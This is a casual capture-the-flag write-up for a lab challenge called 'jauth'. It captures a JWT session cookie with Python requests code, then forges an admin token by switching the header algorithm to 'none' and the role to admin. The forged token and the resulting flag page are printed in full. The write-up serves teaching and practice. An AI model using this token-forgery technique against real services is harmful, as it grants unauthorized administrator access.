# jauth

there is always a jwt session hijack in ctfs. always.

and thats not because its productive or anything it just impedes my speed.

![alt text](image-5.png)


nicely designed website what can we get from this?


- checked source not much is there besides the really obvious POST /auth method that we will be exploiting


- when auth fails shows this

![alt text](image-7.png)

this is good we need a sample account to forge a jwt session

- you guys see the network tab?

the first /auth failed but the last one succeeded

we logged in with the test creds

![alt text](image-6.png)

ru fr?


# solving process

blatantly obvious that there's a jwt cookie somewhere since theres nothing else provided other than endpoint


![alt text](image-7.png)
there we go thats our token

now if i put this into curlconverter.com

in a readable format this says this basically


```py
import requests

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://chatelaine.cylabacademy.net:15382',
    'Pragma': 'no-cache',
    'Referer': 'http://chatelaine.cylabacademy.net:15382/auth',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

data = {
    'username': 'test',
    'password': 'Test123!',
}

response = requests.post('http://chatelaine.cylabacademy.net:15382/auth', headers=headers, data=data, verify=False)


cookies = {
    'token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzkxMjEyMTEzNDU2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkxMjEyMTEzfQ.8Co1XhO5LpeSwy0LhU1NDR5VTKHNH7O0iHFbZs8kA9I',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Referer': 'http://chatelaine.cylabacademy.net:15382/auth',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
    # 'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzkxMjEyMTEzNDU2LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkxMjEyMTEzfQ.8Co1XhO5LpeSwy0LhU1NDR5VTKHNH7O0iHFbZs8kA9I',
}

response = requests.get('http://chatelaine.cylabacademy.net:15382/private', cookies=cookies, headers=headers, verify=False)
```

there's our token we go to jwt.io to debug the token

![alt text](image-8.png)

json web tokens have this structure - header payload signature, they're all encoded in base64

decoded payload look a lil like this when we decoded our test creds

```
{
  "auth": 1791212113456,
  "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
  "role": "user",
  "iat": 1791212113
}
```

if you change up the user to admin (which is a pretty common thing to do in ctfs btw, not pulling this out of my ass)

you can surgically put this in and substitute this as the decoded payload in your jwt token for test credentials making a new one

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzkxMjE0MTk4NjQ1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MTIxNDE5OX0

KEY BEING - that header thing we looked at earlier? we make sure it uses the "none" algorithm

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

this makes it so that a badly configured jwt authentication system suddenly turns it's security gate off for your token.


the response was then - 
```html

<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <title>Our Bank</title>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootswatch/3.2.0/united/bootstrap.min.css"
    />
    <style type="text/css">
      .form-signin {
        width: 100%;
        max-width: 420px;
        padding: 15px;
        margin: auto;
      }
    </style>
  </head>
  <body>
    <div class="text-center">
      <h1>Hello, admin! You have logged in as admin!</h1>
    </div>
    <div class="text-center"><span>academy{succ3ss_@u7h3nt1c@710n_99bf4b72}</span></div>
    <form class="form-signin" action="/logout" method="GET">
      <div class="text-center mb-4">
        <input type="submit" class="btn btn-danger" value="logout" />
      </div>
    </form>
  </body>
</html>
```
